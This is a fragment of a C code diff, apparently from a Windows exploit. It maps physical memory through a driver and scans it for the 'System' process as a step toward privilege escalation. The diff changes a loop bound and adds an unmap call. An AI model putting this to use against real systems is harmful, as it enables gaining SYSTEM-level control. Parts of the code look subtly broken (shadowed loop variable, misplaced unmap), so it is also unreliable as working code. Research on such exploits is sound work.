@@ -63,7 +63,7 @@ int main(char argc, char** argv)
 	}
 
 	printf("\n\nTrying to find SYSTEM in physical memory...\n");
-	for (int i = 0; i <= memRegionsCount; i++) {
+	for (int i = 0; i < memRegionsCount; i++) {
 		__int64 start = memRegion[i].address;
 		__int64 end = memRegion[i].address + memRegion[i].size;
 		printf("%p - %p\n", (void*)start, (void*)end);
@@ -74,6 +74,13 @@ int main(char argc, char** argv)
 				if (memcmp("System\0\0\0\0\0\0\0\0\0", (unsigned char*)(buf + i), 14) == 0) {
 					printf("Found SYSTEM!\n");
 					system("pause");
+				}
+				IOCTL_buffer buffer = { 0 };
+				buffer.SectionHandle = hPhysicalMemory;
+				buffer.PhysicalBaseAddress = buf;
+				if (UnmapPhysicalMemory(&buffer) == 1) {
+					printf("UnmapPhysicalMemory failed");
+					return EXIT_FAILURE;
 				}
 			}
 		}
